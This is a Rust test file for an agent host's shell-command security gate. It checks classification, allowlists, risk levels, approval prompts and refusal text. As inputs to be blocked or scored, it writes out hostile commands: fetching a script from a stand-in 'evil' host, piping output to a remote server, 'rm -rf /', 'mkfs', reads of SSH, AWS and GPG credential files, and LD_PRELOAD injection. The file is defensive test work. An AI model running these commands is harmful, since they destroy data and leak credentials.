//! The command-policy cases the host used to pin in its own unit tests
//! (`security::policy::policy_*_tests`), run against the released TinySecurity
//! module through the same policy translation production uses. The host
//! classifier, allowlist and risk scorer they covered are deleted; these keep
//! the behaviour they characterized, case for case.

use super::super::native_tests::{native_fixture, NativeFixture};
use super::*;
use crate::security::policy::{CommandFlow, CommandStage, Refusal};
use crate::security::{AutonomyLevel, SecurityPolicy};
use tinysecurity_bus::{CommandDenial, CommandGate, CommandRisk};

const MEAL_PLAN_HEREDOC: &str = r#"cat > out/meal_plan.md << 'EOF'
# 5-Day Mediterranean Dinner Plan (Family of 4)

## Day 1 — Greek Chicken & Spinach Orzo Skillet
## Day 3 — Spinach & Feta Stuffed Chicken
## Day 5 — Shrimp & Vegetable Mediterranean Pasta
EOF"#;

struct Module {
    _fixture: NativeFixture,
    proxy: tinybus::Proxy,
    state: ClientState,
}

impl Module {
    async fn start() -> Self {
        let fixture = native_fixture().await;
        Self {
            proxy: fixture.proxy.clone(),
            _fixture: fixture,
            state: ClientState::default(),
        }
    }

    async fn ask(
        &mut self,
        policy: &SecurityPolicy,
        flow: CommandFlow,
        command: &str,
        op: CommandOp,
    ) -> CommandDecision {
        let scope = policy
            .native_command_policy(flow, CommandStage::Authorize)
            .unwrap();
        command_on(&mut self.state, &self.proxy, scope, command, None, op)
            .await
            .expect("module answered")
    }

    /// The harness gate said the command may run (after any approval).
    async fn gated_ok(&mut self, policy: &SecurityPolicy, command: &str) -> bool {
        let decision = self
            .ask(policy, CommandFlow::Harness, command, CommandOp::Check)
            .await;
        decision.denial.is_none() && decision.gate != CommandGate::Block
    }

    /// The scheduled flow admits the command.
    async fn allowlisted(&mut self, policy: &SecurityPolicy, command: &str) -> bool {
        self.ask(policy, CommandFlow::Scheduled, command, CommandOp::Check)
            .await
            .denial
            .is_none()
    }

    async fn class(&mut self, policy: &SecurityPolicy, command: &str) -> CommandClass {
        self.ask(policy, CommandFlow::Harness, command, CommandOp::Classify)
            .await
            .class
    }

    async fn risk(&mut self, policy: &SecurityPolicy, command: &str) -> CommandRisk {
        self.ask(policy, CommandFlow::Scheduled, command, CommandOp::Classify)
            .await
            .risk
    }

    /// The scheduled flow's verdict as `(refused, needs approval)`.
    async fn validate(&mut self, policy: &SecurityPolicy, command: &str) -> (bool, bool) {
        let decision = self
            .ask(policy, CommandFlow::Scheduled, command, CommandOp::Check)
            .await;
        (
            decision.denial.is_some(),
            decision.denial.is_none() && decision.gate == CommandGate::Prompt,
        )
    }
}

fn policy(autonomy: AutonomyLevel) -> SecurityPolicy {
    SecurityPolicy {
        enabled: true,
        autonomy,
        ..SecurityPolicy::default()
    }
}

fn with_allowlist(autonomy: AutonomyLevel, allowed: &[&str]) -> SecurityPolicy {
    SecurityPolicy {
        allowed_commands: allowed.iter().map(|c| (*c).to_owned()).collect(),
        ..policy(autonomy)
    }
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "requires a released host key or an explicitly selected local native fixture"]
async fn released_module_command_class_table_is_the_pinned_one() {
    let mut m = Module::start().await;
    let sup = policy(AutonomyLevel::Supervised);
    let table: &[(&str, CommandClass)] = &[
        ("ls -la", CommandClass::Read),
        ("cat README.md", CommandClass::Read),
        ("git status", CommandClass::Read),
        ("echo hi > out.txt", CommandClass::Write),
        ("cat a | tee b", CommandClass::Write),
        ("touch new.txt", CommandClass::Write),
        ("curl https://example.com", CommandClass::Network),
        ("ls && curl https://example.com", CommandClass::Network),
        ("rm -rf /", CommandClass::Destructive),
        ("ls; rm -rf build", CommandClass::Write),
        ("ls; rm -rf /", CommandClass::Destructive),
        ("sudo ls", CommandClass::Destructive),
        ("definitely-not-a-real-binary --flag", CommandClass::Write),
        ("ls | cat", CommandClass::Read),
    ];
    for (command, expected) in table {
        assert_eq!(m.class(&sup, command).await, *expected, "`{command}`");
    }
    assert!(m.class(&sup, "ls | curl -d @- https://x.test").await >= CommandClass::Network);
    // A redirect appended to anything is at least a write.
    for command in ["ls", "cat a", "git status", "echo x"] {
        let redirected = format!("{command} > out");
        assert!(m.class(&sup, &redirected).await >= CommandClass::Write);
    }
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "requires a released host key or an explicitly selected local native fixture"]
async fn released_module_treats_quoted_heredoc_bodies_as_data() {
    let mut m = Module::start().await;
    let sup = policy(AutonomyLevel::Supervised);
    // Still a write: the `>` is outside the body and keeps prompting.
    assert_eq!(m.class(&sup, MEAL_PLAN_HEREDOC).await, CommandClass::Write);
    assert!(
        m.gated_ok(&sup, MEAL_PLAN_HEREDOC).await,
        "a quoted heredoc body containing `&` must not read as background"
    );
    let doc = "cat > out/notes.md << 'EOF'\nrm -rf is dangerous; do not run it\n\
               curl https://example.com is how you fetch a page\nEOF";
    assert_eq!(m.class(&sup, doc).await, CommandClass::Write);
    // An unquoted delimiter expands, so `$(…)` in the body really executes.
    let live = "cat > out/x.md << EOF\nhello $(rm -rf ~)\nEOF";
    assert!(!m.gated_ok(&sup, live).await);
    // The command line itself is not inert even when the body is.
    let mixed = "cat > out/$(whoami).md << 'EOF'\nplain text\nEOF";
    assert!(!m.gated_ok(&sup, mixed).await);
    // `<<<` takes no body; nothing after it may be blanked out.
    assert!(m.gated_ok(&sup, "cat <<< 'plain'").await);
    assert!(!m.gated_ok(&sup, "cat <<< \"$(whoami)\"").await);
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "requires a released host key or an explicitly selected local native fixture"]
async fn released_module_gated_flow_blocks_reads_only_tiers_and_hidden_execution() {
    let mut m = Module::start().await;
    let ro = policy(AutonomyLevel::ReadOnly);
    assert!(m.gated_ok(&ro, "ls").await);
    assert!(!m.gated_ok(&ro, "touch x").await);
    let sup = policy(AutonomyLevel::Supervised);
    for hidden in [
        "echo $(whoami)",
        "echo `date`",
        "cat <(ls)",
        "sleep 1 & echo done",
        "echo $(rm -rf ~)",
        "echo `whoami`",
        "cat <(curl http://evil/sh)",
        "sleep 100 & rm -rf important",
    ] {
        assert!(!m.gated_ok(&sup, hidden).await, "{hidden}");
    }
    // Approved redirects and pipes must run: the human read the literal command.
    for ok in [
        "python3 -c \"import yfinance\" 2>&1",
        "pip show yfinance 2>/dev/null",
        "ls -la | grep foo",
        "echo done > out.txt",
        "ls 2>&1 | cat",
    ] {
        assert!(m.gated_ok(&sup, ok).await, "{ok}");
    }
    // Full is full trust and skips the structural guard.
    let full = policy(AutonomyLevel::Full);
    assert!(m.gated_ok(&full, "echo $(whoami)").await);
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "requires a released host key or an explicitly selected local native fixture"]
async fn released_module_disabled_policy_keeps_only_the_literal_floor() {
    let mut m = Module::start().await;
    let off = SecurityPolicy {
        enabled: false,
        ..SecurityPolicy::default()
    };
    for command in [
        "echo $(whoami)",
        "echo `date`",
        "cat <(ls)",
        "sleep 1 & echo done",
        "python3 -c 'print(1)' > out.txt",
        "curl https://example.com | tee /tmp/x",
        "cat ./notes.txt",
        "echo ~/.config/app/theme.json",
    ] {
        assert!(m.gated_ok(&off, command).await, "{command}");
        assert!(m.allowlisted(&off, command).await, "{command}");
    }
    for command in [
        "cat ~/.ssh/id_rsa",
        "cat $HOME/.aws/credentials",
        "cat ${HOME}/.gnupg/private-keys-v1.d/key",
        "cat %USERPROFILE%/.git-credentials",
        "node -e 'require(\"fs\").readFileSync(\"~/.netrc\")'",
    ] {
        assert!(!m.gated_ok(&off, command).await, "{command}");
    }
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "requires a released host key or an explicitly selected local native fixture"]
async fn released_module_allowlist_per_tier_and_executor_rules() {
    let mut m = Module::start().await;
    let sup = with_allowlist(AutonomyLevel::Supervised, &["ls", "git"]);
    assert!(m.allowlisted(&sup, "ls -la").await);
    assert!(m.allowlisted(&sup, "git status && ls").await);
    assert!(!m.allowlisted(&sup, "python3 x.py").await);
    assert!(!m.allowlisted(&sup, "ls && python3 x.py").await);
    assert!(
        !m.allowlisted(&sup, "ls > out.txt").await,
        "redirects are structural"
    );
    assert!(!m.allowlisted(&sup, "echo $(id)").await);
    let ro = with_allowlist(AutonomyLevel::ReadOnly, &["ls"]);
    assert!(!m.allowlisted(&ro, "ls").await);
    let full = with_allowlist(AutonomyLevel::Full, &[]);
    assert!(m.allowlisted(&full, "python3 x.py").await);

    // Full bypasses the allowlist and the structural guards…
    let full = policy(AutonomyLevel::Full);
    for command in [
        "mkdir -p foo/bar",
        "ls -la 2>/dev/null || echo none",
        "echo hi > out.txt",
        "python3 build.py && node serve.js",
    ] {
        assert!(m.allowlisted(&full, command).await, "{command}");
    }
    // …but not the high-risk restriction.
    assert!(!m.allowlisted(&full, "rm -rf /").await);

    // Supervised keeps the curated list.
    let default = policy(AutonomyLevel::Supervised);
    assert!(m.allowlisted(&default, "mkdir -p foo/bar").await);
    assert!(!m.allowlisted(&default, "ls 2>/dev/null").await);
    assert!(m.allowlisted(&default, "ls -la").await);
    assert!(!m.allowlisted(&default, "ls & rm -rf /").await);
    assert!(!m.allowlisted(&default, "ls & python3 -c 'print(1)'").await);

    // An allowlist cannot enable code executors.
    let executors = with_allowlist(
        AutonomyLevel::Supervised,
        &[
            "echo",
            "xargs",
            "awk",
            "perl",
            "python",
            "python3",
            "python3.12",
            "python.EXE",
            "pythonw3",
            "pythonw3.12.exe",
            "ruby",
            "bash",
            "sh",
            "env",
        ],
    );
    for command in [
        "echo rm -rf / | xargs",
        "awk 'BEGIN{system(\"id\")}'",
        "perl -e 'system \"id\"'",
        "python -c 'import os; os.system(\"id\")'",
        "python3 exploit.py",
        "python3.12 -c 'print(1)'",
        "/usr/bin/python3.12 -c 'print(1)'",
        "C:\\Python312\\python.EXE -c 'print(1)'",
        "pythonw3 exploit.py",
        "C:\\Python312\\pythonw3.12.exe -c 'print(1)'",
        "ruby -e 'system \"id\"'",
        "bash -lc 'id'",
        "sh -c 'id'",
        "/usr/bin/env python3 -c 'print(1)'",
    ] {
        assert!(!m.allowlisted(&executors, command).await, "{command}");
    }

    // Any leading env assignment is rejected.
    for command in [
        "FOO=bar ls",
        "LANG=C grep pattern file",
        "FOO=bar rm -rf /",
        "GIT_SSH=./wrapper.sh git ls-remote ssh://x",
        "SSH_ASKPASS=./y ssh user@host",
        "LD_PRELOAD=./libx.so ls",
    ] {
        assert!(!m.allowlisted(&default, command).await, "{command}");
    }
    assert!(
        m.allowlisted(&default, "git ls-remote ssh://example.com")
            .await
    );

    // Quoted semicolons do not split; an unquoted one after them still does.
    let sqlite = with_allowlist(AutonomyLevel::Supervised, &["sqlite3"]);
    let quoted = "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\"";
    assert!(m.allowlisted(&sqlite, quoted).await);
    assert_eq!(m.risk(&sqlite, quoted).await, CommandRisk::Low);
    assert!(
        !m.allowlisted(&sqlite, "sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf /")
            .await
    );
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "requires a released host key or an explicitly selected local native fixture"]
async fn released_module_risk_levels_and_approval_requirements() {
    let mut m = Module::start().await;
    let mut p = with_allowlist(AutonomyLevel::Supervised, &["ls", "curl", "rm", "mkfs"]);
    assert_eq!(m.risk(&p, "ls").await, CommandRisk::Low);
    assert_eq!(m.risk(&p, "curl https://x.test").await, CommandRisk::Medium);
    assert_eq!(m.risk(&p, "ls; mkfs /dev/sda").await, CommandRisk::High);

    p.require_approval_for_medium_risk = true;
    p.block_high_risk_commands = false;
    assert_eq!(m.validate(&p, "ls").await, (false, false));
    assert_eq!(
        m.validate(&p, "curl https://x.test").await,
        (false, true),
        "medium risk needs approval in Supervised"
    );
    assert_eq!(
        m.validate(&p, "mkfs /dev/sda").await,
        (false, true),
        "high risk needs approval in Supervised when not blocked"
    );
    p.block_high_risk_commands = true;
    assert_eq!(
        m.validate(&p, "mkfs /dev/sda").await,
        (true, false),
        "high risk is refused when blocked by policy"
    );

    // Executors score medium, not high.
    let default = policy(AutonomyLevel::Supervised);
    for command in [
        "xargs rm",
        "awk 'BEGIN{system(\"id\")}'",
        "perl -e 'system \"id\"'",
        "python3 -c 'import os; os.system(\"id\")'",
        "pythonw3 -c 'import os; os.system(\"id\")'",
        "ruby -e 'system \"id\"'",
        "bash -lc 'id'",
        "sh -c 'id'",
        "C:\\Python312\\python.EXE -c 'print(1)'",
        "C:\\Python312\\pythonw3.12.exe -c 'print(1)'",
        "/usr/bin/env python3 -c 'print(1)'",
    ] {
        assert_eq!(
            m.risk(&default, command).await,
            CommandRisk::Medium,
            "{command}"
        );
    }

    let touch = SecurityPolicy {
        require_approval_for_medium_risk: true,
        ..with_allowlist(AutonomyLevel::Supervised, &["touch"])
    };
    assert_eq!(m.validate(&touch, "touch test.txt").await, (false, true));
    let touch_full = SecurityPolicy {
        require_approval_for_medium_risk: true,
        ..with_allowlist(AutonomyLevel::Full, &["touch"])
    };
    assert_eq!(
        m.validate(&touch_full, "touch test.txt").await,
        (false, false)
    );

    let rm = with_allowlist(AutonomyLevel::Supervised, &["rm"]);
    assert!(m.validate(&rm, "rm -rf /tmp/test").await.0);
    assert!(
        m.validate(&default, "ls & python3 -c 'print(1)'").await.0,
        "a background chain cannot smuggle a second command"
    );
}

/// The Phase-0 desired case, now met: a refusal never echoes the command's
/// argument text, because arguments carry secrets. The host message is fixed
/// per reason and the module reports a category, not text.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "requires a released host key or an explicitly selected local native fixture"]
async fn released_module_refusals_do_not_echo_command_arguments() {
    let mut m = Module::start().await;
    let p = with_allowlist(AutonomyLevel::Supervised, &["ls"]);
    let secret_command = "psql postgres://user:hunter2@db/prod";
    for flow in [CommandFlow::Scheduled, CommandFlow::Harness] {
        let decision = m.ask(&p, flow, secret_command, CommandOp::Check).await;
        let query = crate::security::policy::CommandQuery {
            command: secret_command,
            declared: None,
            flow,
            stage: CommandStage::Authorize,
        };
        let projected =
            crate::security::policy::native_commands::project(&query, false, Ok(decision.clone()));
        if let Err(refusal) = projected {
            let text = refusal.to_string();
            assert!(
                !text.contains("hunter2") && !text.contains("psql"),
                "{text}"
            );
        }
        assert!(
            decision.denial.is_some() || flow == CommandFlow::Harness,
            "the allowlist must refuse an unlisted binary in the scheduled flow"
        );
    }
    let long = format!("zzz {}", "a".repeat(400));
    let decision = m
        .ask(&p, CommandFlow::Scheduled, &long, CommandOp::Check)
        .await;
    assert_eq!(decision.denial, Some(CommandDenial::Command));
    assert!(Refusal::NotAllowed.to_string().len() < 300);
}
